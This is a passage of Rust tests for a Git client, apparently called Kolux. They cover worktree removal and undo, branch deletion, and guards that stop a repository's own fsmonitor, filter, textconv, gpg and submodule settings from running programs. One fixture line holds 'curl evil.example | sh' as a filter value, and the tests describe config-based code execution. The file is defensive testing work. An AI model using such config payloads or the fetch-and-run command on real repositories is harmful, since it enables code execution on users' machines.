        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "undo-me", "HEAD").unwrap();
        fs::write(dest.join("work.txt"), "uncommitted work").unwrap();
        let dest_s = dest.to_string_lossy().into_owned();
        // the removal's first half: folder to the trash, Git's record set aside
        let trash = move_to_trash(&dest).unwrap();
        let record = crate::projects::set_aside_record(&repo, &dest_s).unwrap();
        assert_eq!(git.worktrees(&repo).unwrap().len(), 1, "Git no longer lists it");
        // the undo
        record.restore().unwrap();
        move_back(&trash, &dest).unwrap();
        assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git lists it again");
        assert!(git.dirty(&dest).unwrap(), "Git reads the restored workspace and its uncommitted file");
        assert!(dest.join("work.txt").is_file());
        // and a confirmed removal leaves nothing set aside
        git.worktree_remove(&repo, &dest, Some("undo-me")).unwrap();
        let common = repo.join(".git");
        assert!(!common.join("kolux-set-aside").exists(), "nothing left set aside once the removal is confirmed");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let _ = fs::remove_dir_all(&repo);
    }

    #[test]
    fn row110_removing_a_locked_worktree_leaves_folder_and_record_in_place() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("r110");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-r110-ws-{}", std::process::id())).join("on-usb");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "on-usb", "HEAD").unwrap();
        fs::write(dest.join("work.txt"), "work").unwrap();
        run(&["worktree", "lock", &dest.to_string_lossy()], Some(&repo)).unwrap();
        assert!(git.worktree_remove(&repo, &dest, Some("on-usb")).is_err(), "a locked worktree is refused");
        assert!(dest.join("work.txt").is_file(), "its folder is back in place");
        assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git still lists it");
        let left: Vec<String> = fs::read_dir(dest.parent().unwrap()).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
        assert_eq!(left, vec!["on-usb".to_string()], "no trash folder left behind");
        run(&["worktree", "unlock", &dest.to_string_lossy()], Some(&repo)).unwrap();
        let _ = git.worktree_remove(&repo, &dest, Some("on-usb"));
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let _ = fs::remove_dir_all(&repo);
    }

    // Windows only: a handle opened with no share mode is what stops a rename or delete under it.
    #[cfg(windows)]
    #[test]
    fn row110_a_file_held_open_by_another_program_stops_the_removal_with_everything_still_there() {
        use std::os::windows::fs::OpenOptionsExt;
        let git = Git::detect().unwrap();
        let repo = temp_repo("r110h");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-r110h-ws-{}", std::process::id())).join("held");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "held", "HEAD").unwrap();
        fs::create_dir_all(dest.join("a/b")).unwrap();
        let files = ["work.txt", "a/one.txt", "a/b/two.txt", "a/b/held.txt", "a/b/three.txt"];
        for f in files {
            fs::write(dest.join(f), "uncommitted work").unwrap();
        }
        let holder = fs::OpenOptions::new().read(true).write(true).share_mode(0).open(dest.join("a/b/held.txt")).unwrap();
        let outcome = git.worktree_remove(&repo, &dest, Some("held"));
        drop(holder);
        let err = outcome.unwrap_err();
        assert!(err.contains("nothing was deleted"), "the refusal says nothing was touched: {err}");
        for f in files {
            assert!(dest.join(f).is_file(), "{f} must still be there: nothing is deleted piecemeal");
        }
        assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git still lists it");
        assert!(git.dirty(&dest).unwrap(), "the folder is still a workspace Git can read");
        let left: Vec<String> = fs::read_dir(dest.parent().unwrap()).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
        assert_eq!(left, vec!["held".to_string()], "no trash folder left behind");
        git.worktree_remove(&repo, &dest, Some("held")).unwrap();
        assert!(!dest.exists(), "once the program lets go, the removal goes through");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let _ = fs::remove_dir_all(&repo);
    }

    #[test]
    fn row129_a_kept_branch_is_deleted_only_while_it_still_points_where_it_did() {
        let repo = temp_repo("r129");
        run(&["branch", "kept"], Some(&repo)).unwrap();
        let old = run(&["rev-parse", "refs/heads/kept"], Some(&repo)).unwrap();
        // the branch moves on after the check: the compare-and-delete refuses it
        fs::write(repo.join("more.txt"), "more").unwrap();
        run(&["add", "."], Some(&repo)).unwrap();
        run(&["-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "-m", "more"], Some(&repo)).unwrap();
        let new = run(&["rev-parse", "HEAD"], Some(&repo)).unwrap();
        run(&["update-ref", "refs/heads/kept", &new], Some(&repo)).unwrap();
        assert_eq!(delete_ref_if_at(&repo, "kept", &old), Ok(false));
        assert_eq!(run(&["rev-parse", "refs/heads/kept"], Some(&repo)).unwrap(), new, "a moved branch stays");
        assert_eq!(delete_ref_if_at(&repo, "kept", "--all"), Ok(false), "an option-like commit never reaches Git");
        assert_eq!(delete_ref_if_at(&repo, "kept", &new), Ok(true));
        assert!(run(&["rev-parse", "--verify", "--quiet", "refs/heads/kept"], Some(&repo)).is_err(), "deleted while it pointed where it did");
        let _ = fs::remove_dir_all(&repo);
    }

    #[test]
    fn proj074_removing_a_worktree_leaves_no_trash_and_the_row_is_gone_from_gits_list() {
        let git = Git::detect().unwrap();
        let base = std::env::temp_dir().join(format!("kolux-rs-git-trash-wt-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let repo = base.join("r");
        fs::create_dir_all(&repo).unwrap();
        let g = |args: &[&str], dir: &Path| {
            let out = command_checked(args, Some(dir)).unwrap().output().unwrap();
            assert!(out.status.success(), "{args:?}: {}", String::from_utf8_lossy(&out.stderr));
        };
        g(&["init", "-q", "-b", "main"], &repo);
        fs::write(repo.join("a.txt"), "a").unwrap();
        g(&["add", "."], &repo);
        g(&["-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "-m", "first"], &repo);
        let dest = base.join("ws").join("big");
        git.worktree_add(&repo, &dest, "big", "HEAD").unwrap();
        fs::write(dest.join("big.bin"), vec![7u8; 100_000]).unwrap();
        git.worktree_remove(&repo, &dest, Some("big")).unwrap();
        assert!(!dest.exists());
        assert_eq!(git.worktrees(&repo).unwrap().len(), 1);
        let left: Vec<String> = fs::read_dir(base.join("ws")).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
        assert!(left.is_empty(), "no trash folder is left behind: {left:?}");
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn markdown_files_skip_ignored_ones_and_stop_at_the_cap() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("md");
        fs::create_dir_all(repo.join("docs")).unwrap();
        fs::create_dir_all(repo.join("build")).unwrap();
        fs::write(repo.join("docs").join("guide.md"), "x").unwrap();
        fs::write(repo.join("build").join("out.md"), "x").unwrap();
        fs::write(repo.join("notes.txt"), "x").unwrap();
        fs::write(repo.join(".gitignore"), "build/\n").unwrap();
        let (files, capped) = git.markdown_files(&repo, 10).unwrap();
        let names: Vec<String> = files.iter().map(|f| PathBuf::from(f).strip_prefix(&repo).unwrap().to_string_lossy().replace('\\', "/")).collect();
        assert_eq!(names, ["README.md", "docs/guide.md"]);
        assert!(!capped);
        let (one, capped) = git.markdown_files(&repo, 1).unwrap();
        assert_eq!((one.len(), capped), (1, true));
        fs::remove_dir_all(&repo).unwrap();
    }

    #[test]
    fn changes_list_both_sides_and_diff_sides_read_head_index_and_disk() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("diff");
        run(&["config", "core.autocrlf", "false"], Some(&repo)).unwrap(); // the line ends as written
        fs::write(repo.join("README.md"), "hello staged\n").unwrap();
        run(&["add", "README.md"], Some(&repo)).unwrap();
        fs::write(repo.join("README.md"), "hello staged and more\n").unwrap();
        fs::write(repo.join("new.txt"), "fresh\n").unwrap();
        let rel = |c: &Change| (PathBuf::from(&c.path).strip_prefix(&repo).unwrap().to_string_lossy().into_owned(), c.staged, c.code);
        let list: Vec<_> = git.changes(&repo).unwrap().iter().map(rel).collect();
        assert_eq!(list, [("README.md".into(), true, 'M'), ("README.md".into(), false, 'M'), ("new.txt".into(), false, '?')]);
        let readme = repo.join("README.md");
        assert_eq!(git.diff_sides(&readme, true).unwrap(), ("hello\n".into(), "hello staged\n".into()));
        assert_eq!(git.diff_sides(&readme, false).unwrap(), ("hello staged\n".into(), "hello staged and more\n".into()));
        assert_eq!(git.diff_sides(&repo.join("new.txt"), false).unwrap(), (String::new(), "fresh\n".into()));

        fs::write(repo.join("blob.bin"), [0u8, 1, 2, 0]).unwrap();
        let sizes = |git: &Git| git.change_entries(&repo).unwrap().into_iter().map(|e| (e.lines, e.binary, e.stamp)).collect::<Vec<_>>();
        let before = sizes(&git);
        assert_eq!(before.iter().map(|(l, b, _)| (*l, *b)).collect::<Vec<_>>(), [(Some(2), false), (Some(2), false), (None, true), (Some(1), false)]);
        assert!(before.iter().all(|(_, _, s)| !s.is_empty()), "every change has an identity");
        fs::write(repo.join("README.md"), "hello staged and more, again\n").unwrap();
        let after = sizes(&git);
        assert_eq!(after[0].2, before[0].2, "the staged change is the same");
        assert_ne!(after[1].2, before[1].2, "the unstaged change is not");
        fs::remove_dir_all(&repo).unwrap();
    }

    #[test]
    fn status_parsing_skips_a_renames_old_name() {
        let list = parse_status("R  b.txt\0a.txt\0 D gone.txt\0", Path::new("r"));
        let got: Vec<_> = list.iter().map(|c| (c.path.ends_with("b.txt") || c.path.ends_with("gone.txt"), c.staged, c.code)).collect();
        assert_eq!(got, [(true, true, 'R'), (true, false, 'D')]);
    }

    #[test]
    fn parses_porcelain_output_with_detached_head() {
        let text = "worktree C:/r\nHEAD aaaa\nbranch refs/heads/main\n\nworktree C:/r-wt/x\nHEAD bbbb\ndetached\n";
        let list = parse_worktrees(text);
        assert_eq!(list.len(), 2);
        assert!(list[0].is_main);
        assert_eq!(list[0].branch.as_deref(), Some("main"));
        assert_eq!(list[1].branch, None);
        assert_eq!(list[1].head, "bbbb");
        assert!(list[1].path.ends_with("x"));
    }

    /// T-779 (P2A-01): a folder that arrives with its own `.git/config` names a program in
    /// `core.fsmonitor`; git would run it on the first `status`. Kolux's git never does, whatever
    /// the repository says.
    #[test]
    fn t779_a_repositorys_own_fsmonitor_program_never_runs_under_kolux_git() {
        let dir = temp_repo("fsmonitor");
        let marker = dir.join("fsmonitor-ran.txt");
        let marker_str = marker.to_string_lossy().replace('\\', "/");
        // The hook git runs through its shell; it leaves a marker file where we can see it.
        let hook = if cfg!(windows) { format!("cmd.exe /c echo ran > \"{marker_str}\"") } else { format!("touch \"{marker_str}\"") };
        run(&["config", "core.fsmonitor", &hook], Some(&dir)).unwrap();
        // The attacker's setting is really in the folder's own config, and plain git obeys it.
        let mut plain = Command::new("git");
        plain.args(["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"]).current_dir(&dir).env("GIT_OPTIONAL_LOCKS", "0");
        plain.env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            plain.creation_flags(0x0800_0000); // no console flashes up during the test either
        }
        let plain_out = plain.output().unwrap();
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the fsmonitor program, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
        // Kolux's git, with the exact arguments scm::status uses.
        let out = command(&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's core.fsmonitor program ran under Kolux's git");
        let _ = fs::remove_dir_all(&dir);
    }

    /// T-779 (P2A-01): the guard also holds when the user's own shell already injects config through
    /// `GIT_CONFIG_COUNT`; Kolux's pairs are appended after theirs instead of being dropped.
    #[test]
    fn t779_injected_config_appends_after_the_users_own_slots() {
        let ours = injected_config(None, &[]);
        assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_KEY_0" && v == "core.fsmonitor"), "{ours:?}");
        assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_VALUE_0" && v == "false"), "{ours:?}");
        let count = ours.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
        let n: usize = count.parse().unwrap();
        assert_eq!(n, if cfg!(windows) { 4 } else { 3 });
        // Review fix 2: a repository's own `log.showSignature=true` never runs its gpg program.
        assert!(ours.contains(&("GIT_CONFIG_KEY_1".to_string(), "log.showSignature".to_string())), "{ours:?}");
        assert!(ours.contains(&("GIT_CONFIG_VALUE_1".to_string(), "false".to_string())), "{ours:?}");
        // Review fix 4 (B3): ext:: remotes are never allowed.
        assert!(ours.contains(&("GIT_CONFIG_KEY_2".to_string(), "protocol.ext.allow".to_string())), "{ours:?}");
        assert!(ours.contains(&("GIT_CONFIG_VALUE_2".to_string(), "never".to_string())), "{ours:?}");
        if cfg!(windows) {
            assert!(ours.contains(&("GIT_CONFIG_KEY_3".to_string(), "core.longpaths".to_string())), "{ours:?}");
            assert!(ours.contains(&("GIT_CONFIG_VALUE_3".to_string(), "true".to_string())), "{ours:?}");
        }
        // The user's shell set two pairs: ours start at slot 2 and the count grows by ours.
        let theirs = injected_config(Some(std::ffi::OsStr::new("2")), &[]);
        assert!(theirs.contains(&("GIT_CONFIG_KEY_2".to_string(), "core.fsmonitor".to_string())), "{theirs:?}");
        assert!(theirs.contains(&("GIT_CONFIG_VALUE_2".to_string(), "false".to_string())), "{theirs:?}");
        assert!(!theirs.iter().any(|(k, _)| k == "GIT_CONFIG_KEY_0" || k == "GIT_CONFIG_KEY_1"), "{theirs:?}");
        let count = theirs.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
        assert_eq!(count, (2 + n).to_string());
        // A count git itself would reject ("bogus") is treated as none: ours start at 0.
        let bogus = injected_config(Some(std::ffi::OsStr::new("lots")), &[]);
        assert!(bogus.contains(&("GIT_CONFIG_KEY_0".to_string(), "core.fsmonitor".to_string())), "{bogus:?}");
        // The repository's own program keys follow the fixed pairs, blanked.
        let with = injected_config(None, &[("filter.evil.clean".to_string(), String::new())]);
        assert!(with.contains(&(format!("GIT_CONFIG_KEY_{n}"), "filter.evil.clean".to_string())) && with.contains(&(format!("GIT_CONFIG_VALUE_{n}"), String::new())), "{with:?}");
        assert!(with.contains(&("GIT_CONFIG_COUNT".to_string(), (n + 1).to_string())), "{with:?}");
    }

    /// Plain git, as the control of the guard tests: Kolux's environment, none of its overrides.
    fn plain_git(args: &[&str], dir: &Path) -> std::process::Output {
        let mut plain = Command::new("git");
        plain.args(args).current_dir(dir).env("GIT_OPTIONAL_LOCKS", "0");
        plain.env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            plain.creation_flags(0x0800_0000); // no console flashes up during the test either
        }
        plain.output().unwrap()
    }

    /// A shell line git can run as a filter, textconv, diff, ssh or pack program: it leaves `marker` where
    /// the test can see it and passes the content through. Plain sh on every platform: git runs these lines
    /// through its own sh (Git for Windows ships one), and `cmd.exe /c` under that sh is rewritten to
    /// `cmd.exe C:/`, an interactive cmd that waits on the pipe git holds open (review fix 8).
    fn marker_program(marker: &Path) -> String {
        format!("echo ran >> \"{}\" && cat", marker.to_string_lossy().replace('\\', "/"))
    }

    /// T-779 (P2A-01, review finding 1): a folder arrives with its own `.git/config` naming a
    /// clean filter and an attributes line that applies it to every file. Plain git runs the filter
    /// on `status` and `diff` for every file whose index stat is stale (every file of a folder
    /// extracted from a zip). Kolux's git never does, with the exact arguments `scm::status` uses,
    /// and a `required` driver does not fail the read either.
    #[test]
    fn t779_a_repositorys_own_clean_filter_never_runs_under_kolux_git() {
        let dir = temp_repo("clean-filter");
        let marker = dir.join("filter-ran.txt");
        run(&["config", "filter.evil.clean", &marker_program(&marker)], Some(&dir)).unwrap();
        run(&["config", "filter.evil.required", "true"], Some(&dir)).unwrap();
        fs::write(dir.join(".git").join("info").join("attributes"), "* filter=evil\n").unwrap();
        // The same content written again: the index's stat is stale, so git re-cleans the file.
        fs::write(dir.join("README.md"), "hello\n").unwrap();
        let status_args = ["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"];
        let plain_out = plain_git(&status_args, &dir);
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the clean filter, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
        let out = command(&status_args, Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git status");
        let out = command(&["diff", "--numstat", "-z"], Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git diff");
        // The listing is cached while the config is unchanged, and refreshed when it changes.
        let before = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        run(&["config", "--unset", "filter.evil.required"], Some(&dir)).unwrap();
        let after = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        assert_eq!(before - after, 1, "the unset key is no longer blanked");
        let _ = fs::remove_dir_all(&dir);
    }

    /// T-779 (P2A-01, review finding 1): a textconv the repository configures for itself runs on a
    /// plain `diff` or `show` of a commit. Under Kolux's git it never runs (git has no program to
    /// run and says so instead), and the marker proves it.
    #[test]
    fn t779_a_repositorys_own_textconv_never_runs_under_kolux_git() {
        let dir = temp_repo("textconv");
        let marker = dir.join("textconv-ran.txt");
        run(&["config", "diff.evil.textconv", &marker_program(&marker)], Some(&dir)).unwrap();
        fs::write(dir.join(".git").join("info").join("attributes"), "* diff=evil\n").unwrap();
        let plain_out = plain_git(&["show", "--no-ext-diff", "HEAD"], &dir);
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the textconv, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
        let _ = command(&["show", "--no-ext-diff", "HEAD"], Some(&dir)).output().unwrap();
        assert!(!marker.exists(), "the repository's textconv ran under Kolux's git show");
        let _ = fs::remove_dir_all(&dir);
    }

    /// T-779 (review finding 1): what one listing becomes. Only the repository's own scopes count
    /// (the user's global and system drivers stay), `required` is turned off rather than emptied,
    /// and git-lfs's standard driver is left alone while a driver with any other line is blanked.
    #[test]
    fn t779_repo_program_overrides_blank_the_repositorys_own_keys_but_not_git_lfs() {
        let rec = |scope: &str, key: &str, value: &str| format!("{scope}\0{key}\n{value}\0");
        let listing = [
            rec("system", "diff.astextplain.textconv", "astextplain"),
            rec("global", "filter.lfs.clean", "git-lfs clean -- %f"),
            rec("local", "filter.lfs.clean", "git-lfs clean -- %f"),
            rec("local", "filter.lfs.smudge", "git-lfs smudge -- %f"),
            rec("local", "filter.lfs.process", "git-lfs filter-process"),
            rec("local", "filter.lfs.required", "true"),
            rec("local", "filter.evil.clean", "curl evil.example | sh"),
            rec("local", "filter.evil.required", "true"),
            rec("worktree", "filter.evil.required", "true"),
            rec("local", "filter.fake.clean", "git-lfs clean -- %f"),
            rec("local", "filter.fake.smudge", "git-lfs smudge -- %f && evil"),
            rec("local", "diff.evil.textconv", "evil"),
            rec("local", "diff.evil.command", "evil"),
        ]
        .concat();
        let got = repo_program_overrides(listing.as_bytes());
        let expected: Vec<(String, String)> = [
            ("filter.evil.clean", ""),
            ("filter.evil.required", "false"),
            ("filter.fake.clean", ""),
            ("filter.fake.smudge", ""),
            ("diff.evil.textconv", ""),
            ("diff.evil.command", ""),
        ]
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
        assert_eq!(got, expected);
        assert!(repo_program_overrides(b"").is_empty());
    }

    /// A repository whose own config names a clean filter (a marker-leaving program) that
    /// `.git/info/attributes` applies to every file, plus a changed working file for it to chew on.
    fn filter_repo(name: &str) -> (PathBuf, PathBuf) {
        let dir = temp_repo(name);
        let marker = dir.join("filter-ran.txt");
        run(&["config", "filter.evil.clean", &marker_program(&marker)], Some(&dir)).unwrap();
        fs::write(dir.join(".git").join("info").join("attributes"), "* filter=evil\n").unwrap();
        fs::write(dir.join("README.md"), "changed\n").unwrap();
        (dir, marker)
    }

    /// Review fix 2 (DT-C229, Txais 2026-11-08): a write that runs the folder's own filters is refused
    /// in an untrusted folder, plainly and before anything is staged; reads never run them; a trusted
    /// folder's write runs them.
    #[test]
    fn t779b_a_write_through_the_folders_own_filter_is_refused_unless_the_folder_is_trusted() {
        let (dir, marker) = filter_repo("write-gate");
        // Reads blank the filter, trusted or not: the marker never appears.
        let status = ["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"];
        assert!(command(&status, Some(&dir)).output().unwrap().status.success());
        assert!(!marker.exists(), "a read ran the folder's filter");
        // Untrusted: `add` and `commit` are refused with the filter's name and what to do about it.
        let why = run(&["add", "-A"], Some(&dir)).unwrap_err();
        assert!(why.contains("git add") && why.contains("\"evil\"") && why.contains("filter.evil.clean") && why.contains("not trusted") && why.contains("Trust the folder"), "{why}");
        assert!(run(&["commit", "-q", "-a", "-m", "x"], Some(&dir)).unwrap_err().contains("\"evil\""));
        assert!(!marker.exists(), "a refused write still ran the filter");
        assert_eq!(run(&["diff", "--cached", "--name-only"], Some(&dir)).unwrap(), "", "nothing was staged");
        assert!(write_refusal(&["status"], Some(&dir)).is_none() && write_refusal(&["log", "-1"], Some(&dir)).is_none());
        assert!(command_checked(&["add", "-A"], Some(&dir)).is_err());
        // A linked worktree of the folder is refused to be created the same way.
        let linked = dir.with_file_name(format!("kolux-rs-git-write-gate-linked-{}", std::process::id()));
        let why = run(&["worktree", "add", "-q", "-b", "side", &linked.to_string_lossy(), "HEAD"], Some(&dir)).unwrap_err();
        assert!(why.contains("git worktree add") && why.contains("\"evil\""), "{why}");
        assert!(!linked.exists());
        // Trusted: the write goes ahead and the filter runs.
        trust_for_test(&dir);
        assert!(write_refusal(&["add", "-A"], Some(&dir)).is_none());
        run(&["add", "-A"], Some(&dir)).unwrap();
        assert!(marker.exists(), "the trusted folder's own clean filter did not run on `add`");
        // And a read in the same trusted folder still blanks the filter.
        fs::remove_file(&marker).unwrap();
        fs::write(dir.join("README.md"), "changed again\n").unwrap();
        assert!(command(&status, Some(&dir)).output().unwrap().status.success());
        assert!(!marker.exists(), "a read ran the filter in a trusted folder");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2: git-lfs's own three lines never refuse a write, and a driver that only says
    /// `required` runs nothing; a main checkout's trust covers its linked worktrees.
    #[test]
    fn t779b_git_lfs_and_a_required_only_driver_never_block_a_write_and_trust_follows_the_main_checkout() {
        let dir = temp_repo("write-lfs");
        for (k, v) in [("filter.lfs.clean", "git-lfs clean -- %f"), ("filter.lfs.smudge", "git-lfs smudge -- %f"), ("filter.lfs.process", "git-lfs filter-process"), ("filter.lfs.required", "true"), ("filter.never.required", "true")] {
            run(&["config", k, v], Some(&dir)).unwrap();
        }
        assert!(write_refusal(&["add", "-A"], Some(&dir)).is_none());
        // A filter of the folder's own, then a linked worktree of a trusted main checkout.
        run(&["config", "filter.evil.smudge", "cat"], Some(&dir)).unwrap();
        let linked = dir.with_file_name(format!("kolux-rs-git-write-lfs-linked-{}", std::process::id()));
        assert!(plain_git(&["worktree", "add", "-q", "-b", "side", &linked.to_string_lossy(), "HEAD"], &dir).status.success());
        assert!(write_refusal(&["add", "-A"], Some(&linked)).is_some(), "untrusted main checkout: refused in its worktree too");
        trust_for_test(&dir);
        assert!(write_refusal(&["add", "-A"], Some(&linked)).is_none(), "the main checkout is trusted");
        let _ = fs::remove_dir_all(&linked);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 2: a submodule's own config (and attributes) are read by the child git a
    /// parent `status` starts for it. Kolux blanks the filter named there too, for every command that
    /// reads a submodule: status with and without `--ignore-submodules=none`, and a numstat diff.
    #[test]
    fn t779b_a_submodules_own_clean_filter_never_runs_under_kolux_git() {
        let sub_src = temp_repo("modsrc");
        let dir = temp_repo("modparent");
        let url = sub_src.to_string_lossy().replace('\\', "/");
        let added = plain_git(&["-c", "protocol.file.allow=always", "submodule", "add", "-q", &url, "sub"], &dir);
        assert!(added.status.success(), "{}", String::from_utf8_lossy(&added.stderr));
        assert!(plain_git(&["commit", "-q", "-m", "add sub"], &dir).status.success());
        let module = dir.join(".git").join("modules").join("sub");
        let marker = dir.join("sub-filter-ran.txt");
        let config = module.join("config");
        let mut text = fs::read_to_string(&config).unwrap();
        text.push_str(&format!("[filter \"evil\"]\n\tclean = {}\n", marker_program(&marker)));
        fs::write(&config, text).unwrap();
        fs::create_dir_all(module.join("info")).unwrap();
        fs::write(module.join("info").join("attributes"), "* filter=evil\n").unwrap();
        // The same bytes written again: the stat is stale, so the submodule's git re-cleans the file.
        let readme = dir.join("sub").join("README.md");
        let bytes = fs::read(&readme).unwrap();
        std::thread::sleep(std::time::Duration::from_millis(1100));
        fs::write(&readme, bytes).unwrap();
        let args: [&[&str]; 3] = [&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], &["status", "--porcelain=v2", "--ignore-submodules=none", "-z"], &["diff", "--numstat", "-z", "--ignore-submodules=none"]];
        let control = plain_git(args[1], &dir);
        assert!(control.status.success(), "{}", String::from_utf8_lossy(&control.stderr));
        assert!(marker.exists(), "control: git itself did not run the submodule's clean filter, so the test proves nothing");
        for a in args {
            let _ = fs::remove_file(&marker);
            let out = command(a, Some(&dir)).output().unwrap();
            assert!(out.status.success(), "{a:?}: {}", String::from_utf8_lossy(&out.stderr));
            assert!(!marker.exists(), "the submodule's clean filter ran under Kolux's git {a:?}");
        }
        let _ = fs::remove_dir_all(&sub_src);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 2: the submodule configs under `.git/modules` are found recursively (a
    /// nested submodule's git folder sits inside its parent's), a name with a slash is a folder on the
    /// way, and a change to any of them changes what the repository's blanked keys are.
    #[test]
    fn t779b_module_configs_are_found_recursively_and_a_change_refreshes_the_listing() {
        let dir = temp_repo("modwalk");
        let modules = dir.join(".git").join("modules");
        for rel in ["sub", "sub/modules/inner", "a/b", "a/b/modules/deep", "a/b/modules/deep/modules/deeper"] {
            let folder = modules.join(rel);
            fs::create_dir_all(&folder).unwrap();
            fs::write(folder.join("config"), "[core]\n\tbare = false\n").unwrap();
        }
        let mut got = Vec::new();
        module_configs(&modules, &mut got, 0);
        let mut got: Vec<String> = got.iter().map(|p| p.strip_prefix(&modules).unwrap().to_string_lossy().replace('\\', "/")).collect();
        got.sort();
        assert_eq!(got, ["a/b/config", "a/b/modules/deep/config", "a/b/modules/deep/modules/deeper/config", "sub/config", "sub/modules/inner/config"]);
        // A filter in the deepest one is blanked at once, and the listing follows its next change.
        let args = ["status", "--porcelain=v2", "-z"];
        let keys = |dir: &Path| command(&args, Some(dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
        let base = keys(&dir);
        let deepest = modules.join("a/b/modules/deep/modules/deeper/config");
        fs::write(&deepest, "[filter \"evil\"]\n\tclean = evil\n").unwrap();
        assert_eq!(keys(&dir), base + 1, "the nested submodule's filter is blanked");
        fs::write(&deepest, "[filter \"evil\"]\n\tclean = evil\n\tsmudge = evil\n").unwrap();
        assert_eq!(keys(&dir), base + 2, "the listing was refreshed when the nested config changed");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 2, finding 3: `log.showSignature=true` with a `gpg.program` of the folder's choosing
    /// runs that program on a plain `log -1 --format=%ct` of a signed commit. Under Kolux's git it
    /// does not, and the answer is the same.
    #[test]
    fn t779b_a_repositorys_own_gpg_program_never_runs_under_kolux_git_log() {
        let dir = temp_repo("gpg");
        let marker = dir.join("gpg-ran.txt");
        let script = dir.join("fake-gpg.sh");
        fs::write(&script, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 1\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        run(&["config", "gpg.program", &script.to_string_lossy().replace('\\', "/")], Some(&dir)).unwrap();
        run(&["config", "log.showSignature", "true"], Some(&dir)).unwrap();
        // A commit that carries a signature, made by hand: no real signing key is needed.
        let tree = run(&["rev-parse", "HEAD^{tree}"], Some(&dir)).unwrap();
        let parent = run(&["rev-parse", "HEAD"], Some(&dir)).unwrap();
        let body = format!("tree {tree}\nparent {parent}\nauthor T <t@example.com> 1700000000 +0000\ncommitter T <t@example.com> 1700000000 +0000\ngpgsig -----BEGIN PGP SIGNATURE-----\n \n iQEzBAABCAAdFiEEAAAA\n =abcd\n -----END PGP SIGNATURE-----\n\nsigned\n");
        let mut hash = Command::new("git");
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            hash.creation_flags(0x0800_0000); // no console window
        }
        hash.args(["hash-object", "-t", "commit", "-w", "--literally", "--stdin"]).current_dir(&dir).stdin(std::process::Stdio::piped()).stdout(std::process::Stdio::piped());
        let mut child = hash.spawn().unwrap();
        std::io::Write::write_all(&mut child.stdin.take().unwrap(), body.as_bytes()).unwrap();
        let oid = String::from_utf8(child.wait_with_output().unwrap().stdout).unwrap().trim().to_string();
        assert!(plain_git(&["update-ref", "HEAD", &oid], &dir).status.success());
        let plain_out = plain_git(&["log", "-1", "--format=%ct"], &dir);
        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
        assert!(marker.exists(), "control: git itself did not run the gpg program, so the test proves nothing");
        fs::remove_file(&marker).unwrap();
